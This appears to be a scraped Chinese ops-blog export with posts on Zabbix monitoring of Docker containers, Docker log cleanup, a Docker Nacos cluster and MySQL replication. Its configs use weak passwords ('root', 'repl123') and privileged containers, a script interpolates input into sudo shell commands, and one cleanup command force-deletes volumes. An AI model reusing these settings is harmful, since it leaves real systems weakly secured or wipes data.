&quot;&#123;#CONTAINERNAME&#125;&quot;:&quot;xxxx-0.0.1-18694&quot; &#125;, &#123; &quot;&#123;#CONTAINERNAME&#125;&quot;:&quot;xxx2-0.0.1-18963&quot; &#125;, &#123; &quot;&#123;#CONTAINERNAME&#125;&quot;:&quot;xxxx3-0.0.1-18697&quot; &#125;, &#123; &quot;&#123;#CONTAINERNAME&#125;&quot;:&quot;xxxx4-0.0.1-18950&quot; &#125; ]&#125; 123456789101112131415161718192021#查看其中一个容器的使用资源情况#监控容器映射后端端口sudo -u zabbix zabbix_get -s 127.0.0.1 -k &quot;docker_process[xxxx-0.0.1-13245,processport,port]&quot;#监控容器内存使用sudo -u zabbix zabbix_get -s 127.0.0.1 -k &quot;docker_process[xxxx-0.0.1-18196,processmem,mem]&quot;#监控容器cpu使用sudo -u zabbix zabbix_get -s 127.0.0.1 -k &quot;docker_process[xxxx-0.0.1-18296,processcpu,cpu]&quot;#监控容器内存使用率sudo -u zabbix zabbix_get -s 127.0.0.1 -k docker_stats[xxxx-0.0.1-18694,mem_percent]#监控容器cpu使用率sudo -u zabbix zabbix_get -s 127.0.0.1 -k docker_stats[xxxx-0.0.1-18694,cpu_percent]#监控流出流量sudo -u zabbix zabbix_get -s 127.0.0.1 -k docker_stats[xxxx-0.0.1-18694,network_rx_bytes]#监控进入流量sudo -u zabbix zabbix_get -s 127.0.0.1 -k docker_stats[xxxx-0.0.1-18694,network_tx_bytes] 4. 配置zabbix Web1. 创建自动发现规则配置 — 主机 – 选择docker容器服务器 – 自动发现 –创建发现规则 12名称：docker containe use resource键值：docker_discovery[docker] 2. 添加监控项原型点击刚创建的自动发现规则 – 监控项原型 – 创建监控项原型 CPU使用率 12345名称：容器:&#123;#CONTAINERNAME&#125; cpu使用率%键值：docker_process[&#123;#CONTAINERNAME&#125;,processcpu,cpu]类型：浮点型单位：%应用集：Docker MEM使用率 12345名称：容器:&#123;#CONTAINERNAME&#125; mem使用率%键值：docker_stats[&#123;#CONTAINERNAME&#125;,mem_percent]类型：浮点型单位：%应用集：Docker MEM使用 1234名称：容器:&#123;#CONTAINERNAME&#125; mem使用量键值：docker_process[&#123;#CONTAINERNAME&#125;,processmem,mem]类型：整数应用集：Docker 流出流量 12345名称：容器:&#123;#CONTAINERNAME&#125; 流出流量键值：docker_stats[&#123;#CONTAINERNAME&#125;,network_rx_bytes]类型：整数单位：bytes应用集：Docker 流入流量 12345名称：容器:&#123;#CONTAINERNAME&#125; 进入流量键值：docker_stats[&#123;#CONTAINERNAME&#125;,network_tx_bytes]类型：整数单位：bytes应用集：Docker 3. 创建图形原型点击刚创建的自动发现规则 – 图形原型 – 创建图形原型 创建网络流量图形 12名称：容器: &#123;#CONTAINERNAME&#125;:network traffic监控项-- 添加原型 -- 选择进入/流出流量 创建CPU/Mem使用率占比 12名称：容器: &#123;#CONTAINERNAME&#125;:CPU/Memory使用率占比监控项-- 添加原型 -- 选择cpu和mem使用率原型 5. 查看图形监测 – 图形 – 选择对应主机 *附录cat docker_discovery.py 123456789#!/usr/bin/env python import osimport simplejson as jsont=os.popen(&quot;&quot;&quot;sudo /bin/docker ps |grep -v &#x27;CONTAINER ID&#x27;|awk &#123;&#x27;print $NF&#x27;&#125; &quot;&quot;&quot;)container_name = []for container in t.readlines(): r = os.path.basename(container.strip()) container_name += [&#123;&#x27;&#123;#CONTAINERNAME&#125;&#x27;:r&#125;]print json.dumps(&#123;&#x27;data&#x27;:container_name&#125;,sort_keys=True,indent=4,separators=(&#x27;,&#x27;,&#x27;:&#x27;)) cat docker_monitor.py 1234567891011121314151617181920212223242526272829303132333435363738394041#!/usr/bin/env python#-*- coding: utf-8 -*-from docker import Clientimport sysimport subprocessimport os def check_container_stats(container_name,collect_item): container_collect=docker_client.stats(container_name) old_result=eval(container_collect.next()) new_result=eval(container_collect.next()) container_collect.close() if collect_item == &#x27;cpu_total_usage&#x27;: result=new_result[&#x27;cpu_stats&#x27;][&#x27;cpu_usage&#x27;][&#x27;total_usage&#x27;] - old_result[&#x27;cpu_stats&#x27;][&#x27;cpu_usage&#x27;][&#x27;total_usage&#x27;] elif collect_item == &#x27;cpu_system_usage&#x27;: result=new_result[&#x27;cpu_stats&#x27;][&#x27;system_cpu_usage&#x27;] - old_result[&#x27;cpu_stats&#x27;][&#x27;system_cpu_usage&#x27;] elif collect_item == &#x27;cpu_percent&#x27;: cpu_total_usage=new_result[&#x27;cpu_stats&#x27;][&#x27;cpu_usage&#x27;][&#x27;total_usage&#x27;] - old_result[&#x27;cpu_stats&#x27;][&#x27;cpu_usage&#x27;][&#x27;total_usage&#x27;] cpu_system_uasge=new_result[&#x27;cpu_stats&#x27;][&#x27;system_cpu_usage&#x27;] - old_result[&#x27;cpu_stats&#x27;][&#x27;system_cpu_usage&#x27;] cpu_num=len(old_result[&#x27;cpu_stats&#x27;][&#x27;cpu_usage&#x27;][&#x27;percpu_usage&#x27;]) result=round((float(cpu_total_usage)/float(cpu_system_uasge))*cpu_num*100.0,2) elif collect_item == &#x27;mem_usage&#x27;: result=new_result[&#x27;memory_stats&#x27;][&#x27;usage&#x27;] elif collect_item == &#x27;mem_limit&#x27;: result=new_result[&#x27;memory_stats&#x27;][&#x27;limit&#x27;] elif collect_item == &#x27;mem_percent&#x27;: mem_usage=new_result[&#x27;memory_stats&#x27;][&#x27;usage&#x27;] mem_limit=new_result[&#x27;memory_stats&#x27;][&#x27;limit&#x27;] result=round(float(mem_usage)/float(mem_limit)*100.0,2) elif collect_item == &#x27;network_rx_bytes&#x27;: network_check_command=&quot;&quot;&quot;sudo /usr/bin/docker exec %s cat /proc/net/dev|sed -n 3p|awk &#x27;&#123;print $2,$10&#125;&#x27;&quot;&quot;&quot;%container_name result=os.popen(network_check_command).read().split()[0] elif collect_item == &#x27;network_tx_bytes&#x27;: network_check_command=&quot;&quot;&quot;sudo /usr/bin/docker exec %s cat /proc/net/dev|sed -n 3p|awk &#x27;&#123;print $2,$10&#125;&#x27;&quot;&quot;&quot;%container_name result=os.popen(network_check_command).read().split()[1] return resultif __name__ == &quot;__main__&quot;: docker_client = Client(base_url=&#x27;unix://var/run/docker.sock&#x27;, version=&#x27;1.17&#x27;) container_name=sys.argv[1] collect_item=sys.argv[2] print check_container_stats(container_name,collect_item) cat docker_processmonitor.sh[脚本已改动优化] 1234567891011121314151617181920212223242526#!/bin/bash#license:GPLprocessmem()&#123; sudo /usr/bin/docker exec $1 ps aux|grep -v &quot;grep&quot;|grep -v &quot;processstatus.sh&quot;|awk &#x27;&#123;sum+=$6&#125;; END&#123;print sum&#125;&#x27;&#125;processcpu()&#123; sudo /usr/bin/docker exec $1 ps aux|grep -v &quot;grep&quot;|grep -v &quot;processstatus.sh&quot;|awk &#x27;&#123;sum+=$3&#125;; END&#123;print sum&#125;&#x27;&#125;processport()&#123; sudo /usr/bin/docker ps |grep -v &quot;grep&quot; |grep $1|awk &#x27;&#123;print $(NF-1)&#125;&#x27;|awk -F [:-] &#x27;&#123;print $2&#125;&#x27;&#125;case &quot;$3&quot; in mem) processmem $1 $2 ;; cpu) processcpu $1 $2 ;; port) processport $1 $2 ;; *) echo &quot;Usage: $0 &#123;docker_containername&#125;&#123;processname&#125;&#123;mem|cpu|port&#125;&quot; ;;esac 参考：51cto","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"zabbix","slug":"zabbix","permalink":"https://garywu520.github.io/tags/zabbix/"},{"name":"docker","slug":"docker","permalink":"https://garywu520.github.io/tags/docker/"},{"name":"自动发现","slug":"自动发现","permalink":"https://garywu520.github.io/tags/%E8%87%AA%E5%8A%A8%E5%8F%91%E7%8E%B0/"},{"name":"docker监控","slug":"docker监控","permalink":"https://garywu520.github.io/tags/docker%E7%9B%91%E6%8E%A7/"}]},{"title":"docker日志限制与docker日志清理","slug":"docker日志限制与docker日志清理","date":"2020-02-07T02:50:21.000Z","updated":"2020-02-07T02:59:41.136Z","comments":true,"path":"2020/02/07/docker日志限制与docker日志清理/","link":"","permalink":"https://garywu520.github.io/2020/02/07/docker%E6%97%A5%E5%BF%97%E9%99%90%E5%88%B6%E4%B8%8Edocker%E6%97%A5%E5%BF%97%E6%B8%85%E7%90%86/","excerpt":"环境中日志产生量太大导致磁盘被爆, 很大原因是因为docker没有限制日志大小造成的。 1. 限制docker容器log大小vim /etc/docker/daemon.json [此文件没有则创建] 123456#增加log-opts参数&#123; &quot;log-driver&quot;:&quot;json-file&quot;, &quot;log-opts&quot;: &#123;&quot;max-size&quot;:&quot;500m&quot;, &quot;max-file&quot;:&quot;3&quot;&#125;&#125; max-size=500m，意味着一个容器日志大小上限是500M， max-file=3，意味着一个容器有三个日志，分别是id+.json、id+1.json、id+2.json","text":"环境中日志产生量太大导致磁盘被爆, 很大原因是因为docker没有限制日志大小造成的。 1. 限制docker容器log大小vim /etc/docker/daemon.json [此文件没有则创建] 123456#增加log-opts参数&#123; &quot;log-driver&quot;:&quot;json-file&quot;, &quot;log-opts&quot;: &#123;&quot;max-size&quot;:&quot;500m&quot;, &quot;max-file&quot;:&quot;3&quot;&#125;&#125; max-size=500m，意味着一个容器日志大小上限是500M， max-file=3，意味着一个容器有三个日志，分别是id+.json、id+1.json、id+2.json 12systemctl daemon-reloadsystemctl restart docker 注：此配置只针对新增的容器生效，故建议一开始优化的时候就配置上 2. docker日常清理12#来删除那些已停止的容器、dangling 镜像、未被容器引用的 network 和构建过程中的 cache，以及未被引用的volumesdocker system prune --all --force --volumes","categories":[],"tags":[{"name":"docker日志","slug":"docker日志","permalink":"https://garywu520.github.io/tags/docker%E6%97%A5%E5%BF%97/"},{"name":"docker日志清理","slug":"docker日志清理","permalink":"https://garywu520.github.io/tags/docker%E6%97%A5%E5%BF%97%E6%B8%85%E7%90%86/"}]},{"title":"CTOP--docker容器运行状态TOP工具","slug":"CTOP-docker容器运行状态TOP工具","date":"2020-02-03T13:29:44.000Z","updated":"2020-02-03T13:31:06.137Z","comments":true,"path":"2020/02/03/CTOP-docker容器运行状态TOP工具/","link":"","permalink":"https://garywu520.github.io/2020/02/03/CTOP-docker%E5%AE%B9%E5%99%A8%E8%BF%90%E8%A1%8C%E7%8A%B6%E6%80%81TOP%E5%B7%A5%E5%85%B7/","excerpt":"","text":"官网：https://ctop.sh/github: https://github.com/bcicen/ctop 123wget https:&#x2F;&#x2F;github.com&#x2F;bcicen&#x2F;ctop&#x2F;releases&#x2F;download&#x2F;v0.7.3&#x2F;ctop-0.7.3-linux-amd64 -O &#x2F;usr&#x2F;local&#x2F;bin&#x2F;ctopchmod +x &#x2F;usr&#x2F;local&#x2F;bin&#x2F;ctop","categories":[],"tags":[{"name":"htop","slug":"htop","permalink":"https://garywu520.github.io/tags/htop/"},{"name":"top","slug":"top","permalink":"https://garywu520.github.io/tags/top/"},{"name":"ctop","slug":"ctop","permalink":"https://garywu520.github.io/tags/ctop/"}]},{"title":"nacos高可用集群方案-Docker","slug":"nacos高可用集群方案-Docker","date":"2020-01-08T10:40:49.000Z","updated":"2020-01-08T10:43:24.845Z","comments":true,"path":"2020/01/08/nacos高可用集群方案-Docker/","link":"","permalink":"https://garywu520.github.io/2020/01/08/nacos%E9%AB%98%E5%8F%AF%E7%94%A8%E9%9B%86%E7%BE%A4%E6%96%B9%E6%A1%88-Docker/","excerpt":"环境 服务名称 IP 宿主机IP Docker子网 Nacos1 10.100.10.2:8848 192.168.1.201:8848 10.100.10.0/24 Nacos2 10.100.20.2:8848 192.168.1.202:8848 10.100.20.0/24 Nacos3 10.100.30.2:8848 192.168.1.203:8848 10.100.30.0/24 MySQL主 172.17.0.2:3306 172.17.0.0/16 MySQL从 172.17.0.3:3306 172.17.0.0/16 注：准备好MySQL主从环境","text":"环境 服务名称 IP 宿主机IP Docker子网 Nacos1 10.100.10.2:8848 192.168.1.201:8848 10.100.10.0/24 Nacos2 10.100.20.2:8848 192.168.1.202:8848 10.100.20.0/24 Nacos3 10.100.30.2:8848 192.168.1.203:8848 10.100.30.0/24 MySQL主 172.17.0.2:3306 172.17.0.0/16 MySQL从 172.17.0.3:3306 172.17.0.0/16 注：准备好MySQL主从环境 1. Nacos初始化SQL下载 nacos.sql Github 后导入MySQL主库中 1234$ mysql -uroot -p -h 127.0.0.1 -P 3305mysql&gt; create database nacos_config;mysql&gt; use nacos_config;mysql&gt; source /root/nacos-mysql.sql 2. 配置Nacos1-20112345#init.d/custom.properties是官方提供的自选功能配置文件，每个节点均需要此文件，保持默认即可mkdir -p /root/nacos-cluster-docker/init.d#nacos1/docker-compose-nacos1.yml是第一个Nacos节点的Docker-compose配置文件mkdir -p /root/nacos-cluster-docker/nacos1 官方的init.d/custom.properties配置文件 12345678910111213141516171819#spring.security.enabled=false#management.security=false#security.basic.enabled=false#nacos.security.ignore.urls=/**#management.metrics.export.elastic.host=http://localhost:9200# metrics for prometheusmanagement.endpoints.web.exposure.include=*# metrics for elastic search#management.metrics.export.elastic.enabled=false#management.metrics.export.elastic.host=http://localhost:9200# metrics for influx#management.metrics.export.influx.enabled=false#management.metrics.export.influx.db=springboot#management.metrics.export.influx.uri=http://localhost:8086#management.metrics.export.influx.auto-create-db=true#management.metrics.export.influx.consistency=one#management.metrics.export.influx.compressed=true Nacos1-201服务器的docker-compose-nacos1.yml 12345678910111213141516171819202122232425262728293031323334353637383940414243444546version: &#x27;2&#x27; #注：自定义网段要求使用版本2，版本3会报错services: # nacos-server服务注册与发现，配置中心服务 docker-nacos-server: image: nacos/nacos-server:latest container_name: nacos-server-1 ports: - &quot;8848:8848&quot; - &quot;9555:9555&quot; networks: default: ipv4_address: 10.100.10.2 restart: on-failure privileged: true environment: PREFER_HOST_MODE: ip SPRING_DATASOURCE_PLATFORM: mysql NACOS_SERVER_IP: 10.100.10.2 NACOS_SERVERS: 10.100.10.2:8848 10.100.20.2:8848 10.100.30.2:8848 MYSQL_MASTER_SERVICE_HOST: 172.17.0.2 #mysql配置，Master为主节点，Slave为从节点 MYSQL_MASTER_SERVICE_PORT: 3306 MYSQL_MASTER_SERVICE_DB_NAME: nacos_config MYSQL_MASTER_SERVICE_USER: root MYSQL_MASTER_SERVICE_PASSWORD: root MYSQL_SLAVE_SERVICE_HOST: 172.17.0.3 MYSQL_SLAVE_SERVICE_PORT: 3306 #JVM调优参数 #JVM_XMS: -Xms default :700m #JVM_XMX: -Xmx default :700m #JVM_XMN: -Xmn default :500m #JVM_MS: #-XX:MetaspaceSize default :128m #JVM_MMS: #-XX:MaxMetaspaceSize default :320m #NACOS_DEBUG: n #是否开启远程debug，y/n，默认n #TOMCAT_ACCESSLOG_ENABLED: true #是否开始tomcat访问日志的记录，默认false volumes: - /data/A/nacos1:/home/nacos/logs #日志输出目录 - ../init.d/custom.properties:/home/nacos/init.d/custom.propertiesnetworks: default: driver: bridge ipam: driver: default config: - subnet: 10.100.10.0/24 gateway: 10.100.10.1 配置静态路由 123#添加mysql回程静态路由ip route add 10.100.20.0/24 via 192.168.1.202ip route add 10.100.30.0/24 via 192.168.1.203 1234#添加永久路由$vim /etc/sysconfig/network-scripts/route-interface10.100.20.0/24 via 192.168.1.202 dev eth010.100.30.0/24 via 192.168.1.203 dev eth0 启动容器 12cd /root/nacos-cluster-docker/nacos1docker-compose -f docker-compose-nacos1.yml up -d 1234#iptables允许新增的子网网卡转发iptables -A FORWARD -i br-a76f81948ced -o eth0 -j ACCEPTiptables -A FORWARD -i eth0 -o br-a76f81948ced -j ACCEPTiptables -A FORWARD -i br-a76f81948ced -o br-a76f81948ced -j ACCEPT 123#查看logtail -f /data/A/nacos1/start.out2020-01-07 12:08:40,788 INFO Nacos started successfully in cluster mode. 3. 配置Nacos2-202123#init.d/custom.properties是官方提供的自选功能配置文件，每个节点均需要此文件，保持默认即可mkdir -p /root/nacos-cluster-docker/init.dmkdir -p /root/nacos-cluster-docker/nacos2 官方的init.d/custom.properties配置文件 1略 Nacos2-202服务器的docker-compose-nacos2.yml 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647version: &#x27;2&#x27; services: # nacos-server服务注册与发现，配置中心服务 docker-nacos-server: image: nacos/nacos-server:latest container_name: nacos-server-2 ports: - &quot;8848:8848&quot; - &quot;9555:9555&quot; networks: default: ipv4_address: 10.100.20.2 restart: on-failure privileged: true environment: PREFER_HOST_MODE: ip SPRING_DATASOURCE_PLATFORM: mysql NACOS_SERVER_IP: 10.100.20.2 NACOS_SERVERS: 10.100.10.2:8848 10.100.20.2:8848 10.100.30.2:8848 MYSQL_MASTER_SERVICE_HOST: 172.17.0.2 #mysql配置，Master为主节点，Slave为从节点 MYSQL_MASTER_SERVICE_PORT: 3306 MYSQL_MASTER_SERVICE_DB_NAME: nacos_config MYSQL_MASTER_SERVICE_USER: root MYSQL_MASTER_SERVICE_PASSWORD: root MYSQL_SLAVE_SERVICE_HOST: 172.17.0.3 MYSQL_SLAVE_SERVICE_PORT: 3306 #JVM调优参数 #JVM_XMS: -Xms default :700m #JVM_XMX: -Xmx default :700m #JVM_XMN: -Xmn default :500m #JVM_MS: #-XX:MetaspaceSize default :128m #JVM_MMS: #-XX:MaxMetaspaceSize default :320m #NACOS_DEBUG: n #是否开启远程debug，y/n，默认n #TOMCAT_ACCESSLOG_ENABLED: true #是否开始tomcat访问日志的记录，默认false volumes: - /data/A/nacos2:/home/nacos/logs #日志输出目录 - ../init.d/custom.properties:/home/nacos/init.d/custom.propertiesnetworks: default: driver: bridge ipam: driver: default config: - subnet: 10.100.20.0/24 gateway: 10.100.20.1 添加静态路由 123456789#移除本机docker0网卡[否则网段冲突，无法添加]yum -y install bridge-utilsip link set dev docker0 downbrctl delbr docker0#这里静态路由，主要是能让nacos访问mysqlip route add 172.17.0.0/16 via 192.168.1.201ip route add 10.100.10.0/24 via 192.168.1.201ip route add 10.100.30.0/24 via 192.168.1.203 12345#配置永久路由$ vim /etc/sysconfig/network-scripts/route-interface172.17.0.0/16 via 192.168.1.201 dev eth010.100.10.0/24 via 192.168.1.201 dev eth010.100.30.0/24 via 192.168.1.203 dev eth0 启动容器 12cd /root/nacos-cluster-docker/nacos2docker-compose -f docker-compose-nacos2.yml up -d 1#iptables允许新增的子网网卡转发(略) 4. 配置Nacos3-203123#init.d/custom.properties是官方提供的自选功能配置文件，每个节点均需要此文件，保持默认即可mkdir -p /root/nacos-cluster-docker/init.dmkdir -p /root/nacos-cluster-docker/nacos3 官方的init.d/custom.properties配置文件 1略 Nacos3-203服务器的docker-compose-nacos3.yml 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647version: &#x27;2&#x27; services: # nacos-server服务注册与发现，配置中心服务 docker-nacos-server: image: nacos/nacos-server:latest container_name: nacos-server-3 ports: - &quot;8848:8848&quot; - &quot;9555:9555&quot; networks: default: ipv4_address: 10.100.30.2 restart: on-failure privileged: true environment: PREFER_HOST_MODE: ip SPRING_DATASOURCE_PLATFORM: mysql NACOS_SERVER_IP: 10.100.30.2 NACOS_SERVERS: 10.100.10.2:8848 10.100.20.2:8848 10.100.30.2:8848 MYSQL_MASTER_SERVICE_HOST: 172.17.0.2 #mysql配置，Master为主节点，Slave为从节点 MYSQL_MASTER_SERVICE_PORT: 3306 MYSQL_MASTER_SERVICE_DB_NAME: nacos_config MYSQL_MASTER_SERVICE_USER: root MYSQL_MASTER_SERVICE_PASSWORD: root MYSQL_SLAVE_SERVICE_HOST: 172.17.0.3 MYSQL_SLAVE_SERVICE_PORT: 3306 #JVM调优参数 #JVM_XMS: -Xms default :700m #JVM_XMX: -Xmx default :700m #JVM_XMN: -Xmn default :500m #JVM_MS: #-XX:MetaspaceSize default :128m #JVM_MMS: #-XX:MaxMetaspaceSize default :320m #NACOS_DEBUG: n #是否开启远程debug，y/n，默认n #TOMCAT_ACCESSLOG_ENABLED: true #是否开始tomcat访问日志的记录，默认false volumes: - /data/A/nacos3:/home/nacos/logs #日志输出目录 - ../init.d/custom.properties:/home/nacos/init.d/custom.propertiesnetworks: default: driver: bridge ipam: driver: default config: - subnet: 10.100.30.0/24 gateway: 10.100.30.1 添加静态路由 123456789#移除本机docker0网卡[否则网段冲突，无法添加]yum -y install bridge-utilsip link set dev docker0 downbrctl delbr docker0#这里静态路由，主要是能让nacos访问mysqlip route add 172.17.0.0/16 via 192.168.1.201ip route add 10.100.10.0/24 via 192.168.1.201ip route add 10.100.20.0/24 via 192.168.1.202 12345#配置永久路由$ vim /etc/sysconfig/network-scripts/route-interface172.17.0.0/16 via 192.168.1.201 dev eth010.100.10.0/24 via 192.168.1.201 dev eth010.100.20.0/24 via 192.168.1.202 dev eth0 启动容器 12cd /root/nacos-cluster-docker/nacos3docker-compose -f docker-compose-nacos3.yml up -d 1#iptables允许新增的子网网卡转发(略) 5. 访问Nacos UIhttp://192.168.1.201:8848/nacos 默认账号密码都是nacos 集群管理 —&gt;节点列表: 正常情况下可以看到所有节点，且自动完成Leader选举。 10.100.10.2:8848 FOLLOWER 1 15776 3500 10.100.20.2:8848 LEADER 1 16676 5000 10.100.30.2:8848 FOLLOWER 0 10 1116 6. Nginx代理Nacos节点1234567891011121314http&#123; upstream nacos-cluster &#123; server 10.100.10.2:8848; server 10.100.20.2:8848; server 10.100.30.2:8848; &#125; server &#123; listen 8848; location /&#123; proxy_pass http://nacos-cluster; &#125; &#125;&#125;","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"docker","slug":"docker","permalink":"https://garywu520.github.io/tags/docker/"},{"name":"nacos","slug":"nacos","permalink":"https://garywu520.github.io/tags/nacos/"}]},{"title":"docker-compose自定义子网及固定容器IP","slug":"docker-compose自定义子网及固定容器IP","date":"2020-01-08T07:41:53.000Z","updated":"2020-01-09T09:36:29.784Z","comments":true,"path":"2020/01/08/docker-compose自定义子网及固定容器IP/","link":"","permalink":"https://garywu520.github.io/2020/01/08/docker-compose%E8%87%AA%E5%AE%9A%E4%B9%89%E5%AD%90%E7%BD%91%E5%8F%8A%E5%9B%BA%E5%AE%9A%E5%AE%B9%E5%99%A8IP/","excerpt":"docker-compose定义子网，需要指定version为2，如果version设置为3则会报如下错误 12ERROR: The Compose file &#x27;./docker-compose-xxx.yml&#x27; is invalid because:networks.default.ipam.config value Additional properties are not allowed (&#x27;gateway&#x27; was unexpected)","text":"docker-compose定义子网，需要指定version为2，如果version设置为3则会报如下错误 12ERROR: The Compose file &#x27;./docker-compose-xxx.yml&#x27; is invalid because:networks.default.ipam.config value Additional properties are not allowed (&#x27;gateway&#x27; was unexpected) 配置Docker-compose自定义子网及固定IP 12345678910111213141516171819202122232425262728293031323334353637383940version: &#x27;2&#x27; #这里必须是版本2services: docker-nacos-server: image: nacos/nacos-server:latest container_name: nacos-server-2 ports: - &quot;8848:8848&quot; - &quot;9555:9555&quot;#------------------ 引用子网 ----------------------------------# networks: nacosnat: #nacosnat是自定义的网络名称 ipv4_address: 10.100.20.10 #固定IP为10.100.20.10#------------------ 结束区域 ----------------------------------# restart: on-failure privileged: true environment: PREFER_HOST_MODE: ip SPRING_DATASOURCE_PLATFORM: mysql NACOS_SERVER_IP: 192.168.1.202 NACOS_SERVERS: 192.168.1.201:8848 192.168.1.202:8848 192.168.1.203:8848 MYSQL_MASTER_SERVICE_HOST: 192.168.1.201 MYSQL_MASTER_SERVICE_PORT: 3305 MYSQL_MASTER_SERVICE_DB_NAME: nacos_config MYSQL_MASTER_SERVICE_USER: root MYSQL_MASTER_SERVICE_PASSWORD: root MYSQL_SLAVE_SERVICE_HOST: 192.168.1.201 MYSQL_SLAVE_SERVICE_PORT: 3304 volumes: - /data/A/nacos2:/home/nacos/logs - ../init.d/custom.properties:/home/nacos/init.d/custom.properties#------------------ 定义子网信息 ----------------------------------# networks: nacosnat: #nacosnat是自定义的网络名称 driver: bridge ipam: config: - subnet: 10.100.20.0/24 #指定子网 gateway: 10.100.20.1 #指定网关#------------------ 结束区域 ----------------------------------# 验证容器IP 12$ docker inspect -f &#x27;&#123;&#123;range .NetworkSettings.Networks&#125;&#125;&#123;&#123;.IPAddress&#125;&#125;&#123;&#123;end&#125;&#125;&#x27; 1c68d336c52410.100.20.10","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"docker","slug":"docker","permalink":"https://garywu520.github.io/tags/docker/"},{"name":"docker-compose","slug":"docker-compose","permalink":"https://garywu520.github.io/tags/docker-compose/"},{"name":"docker ip","slug":"docker-ip","permalink":"https://garywu520.github.io/tags/docker-ip/"},{"name":"ip","slug":"ip","permalink":"https://garywu520.github.io/tags/ip/"}]},{"title":"Docker部署MySQL主从","slug":"Docker部署MySQL主从","date":"2020-01-07T09:02:35.000Z","updated":"2020-01-07T09:05:46.770Z","comments":true,"path":"2020/01/07/Docker部署MySQL主从/","link":"","permalink":"https://garywu520.github.io/2020/01/07/Docker%E9%83%A8%E7%BD%B2MySQL%E4%B8%BB%E4%BB%8E/","excerpt":"1.环境 mysql:5.7.28 【主从使用的镜像版本一致】 单机双MySQL Docker容器 MySQL Master: 192.168.1.201:3305 MySQL Slave: 192.168.1.201:3304 Iptables 内网开放3304和3305端口","text":"1.环境 mysql:5.7.28 【主从使用的镜像版本一致】 单机双MySQL Docker容器 MySQL Master: 192.168.1.201:3305 MySQL Slave: 192.168.1.201:3304 Iptables 内网开放3304和3305端口 2. Master Docker配置123docker pull mysql:5.7.28mkdir -p /data/A/mysql-mastermkdir -p /root/mysql-master-docker/ vim mysql-master.conf 123456789101112131415161718192021222324252627[client]default-character-set = utf8 [mysql]default-character-set = utf8prompt = \\\\u@\\\\h[\\\\d]&gt;\\\\_[mysqld]#设置server_id，一般设置为IP，同一局域网内注意要唯一server_id=100#修改字符集character-set-server = utf8collation-server = utf8_general_cidefault-time_zone = &#x27;+8:00&#x27;#开启二进制日志功能,名称可以自定义log-bin=edu-mysql-bin#为每个session 分配的内存，在事务过程中用来存储二进制日志的缓存binlog_cache_size=1M#主从复制的格式binlog_format=row#二进制日志自动删除/过期的天数expire_logs_days=7 运行Docker容器 1docker run --name mysql-master -p 3305:3306 -v /root/mysql-master-docker/mysql-master.cnf:/etc/mysql/conf.d/my.cnf -v /data/A/mysql-master:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=root -d mysql:5.7.28 参数说明： 容器的3306端口映射到宿主机的3305端口 把本地的mysql-master.cnf配置文件映射到容器内，修改实时生效。而mysql实际数据最终落地到/data/A/mysql-master目录 默认情况下，MySQL的启动配置文件是/etc/mysql/my.cnf，而/etc/mysql/conf.d目录下的存在任何.cnf格式的文件时，都会使用该文件中配置项替换默认配置。所以这里采用文件映射方式 123456789101112#进入MySQL Master容器docker exec -it mysql-master /bin/bash#验证配置是否已经加载$ mysql -uroot -p -h 127.0.0.1 -P 3305MySQL [(none)]&gt; show variables like &#x27;server_id&#x27;;+---------------+-------+| Variable_name | Value |+---------------+-------+| server_id | 100 |+---------------+-------+1 row in set (0.00 sec) 3. Slave Docker配置12mkdir -p /data/A/mysql-slavemkdir -p /root/mysql-slave-docker/ vim mysql-slave.cnf 123456789101112131415161718192021222324252627282930313233[client]default-character-set = utf8 [mysql]default-character-set = utf8prompt = \\\\u@\\\\h[\\\\d]&gt;\\\\_[mysqld]#设置server_id，一般设置为IP，同一局域网内注意要唯一server_id=101#指定哪个数据库不用同步#binlog-ignore-db=mysql#修改字符集character-set-server = utf8collation-server = utf8_general_cidefault-time_zone = &#x27;+8:00&#x27;#开启二进制日志功能,名称可以自定义log-bin=mysql-bin#为每个session 分配的内存，在事务过程中用来存储二进制日志的缓存binlog_cache_size=1M#主从复制的格式binlog_format=row#二进制日志自动删除/过期的天数expire_logs_days=7#跳过错误,如：1062错误是指一些主键重复，1032错误是因为主从数据库数据不一致slave_skip_errors=1062 运行Docker容器 1docker run --name mysql-slave -p 3304:3306 -v /root/mysql-slave-docker/mysql-slave.cnf:/etc/mysql/conf.d/my.cnf -v /data/A/mysql-slave:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=root -d mysql:5.7.28 123456789101112#进入MySQL Master容器docker exec -it mysql-slave /bin/bash#验证配置是否已经加载$ mysql -uroot -p -h 127.0.0.1 -P 3304MySQL [(none)]&gt; show variables like &#x27;server_id&#x27;;+---------------+-------+| Variable_name | Value |+---------------+-------+| server_id | 101 |+---------------+-------+1 row in set (0.00 sec) slave宿主机上测试连接Docker Master 12[root@localhost ~]# mysql -uroot -p -h 192.168.1.201 -P 3305MySQL [(none)]&gt; 4. Master配置配置数据同步用户 1grant replication slave on *.* to repl@&#x27;%&#x27; identified by &#x27;repl123&#x27;; 查看File position字段的值 1234$ mysql -uroot -p -h 192.168.1.201 -P 3305MySQL [(none)]&gt; show master status;edu-mysql-bin.000003 429 5. Slave执行主从复制命令mysql -uroot -p -h 192.168.1.201 -P 3304 1234567CHANGE MASTER TO MASTER_HOST=&#x27;192.168.1.201&#x27;, MASTER_USER=&#x27;repl&#x27;, MASTER_PASSWORD=&#x27;repl123&#x27;, MASTER_PORT=3305, MASTER_LOG_FILE=&#x27;edu-mysql-bin.000003&#x27;, MASTER_LOG_POS=429; 123stop slave;start slave;show slave status\\G 12345678910111213*************************** 1. row *************************** Slave_IO_State: Waiting for master to send event Master_Host: 192.168.1.201 Master_User: repl Master_Port: 3305 Connect_Retry: 60 Master_Log_File: edu-mysql-bin.000003 Read_Master_Log_Pos: 429 Relay_Log_File: 820cc66bb667-relay-bin.000002 Relay_Log_Pos: 324 Relay_Master_Log_File: edu-mysql-bin.000003 Slave_IO_Running: Yes Slave_SQL_Running: 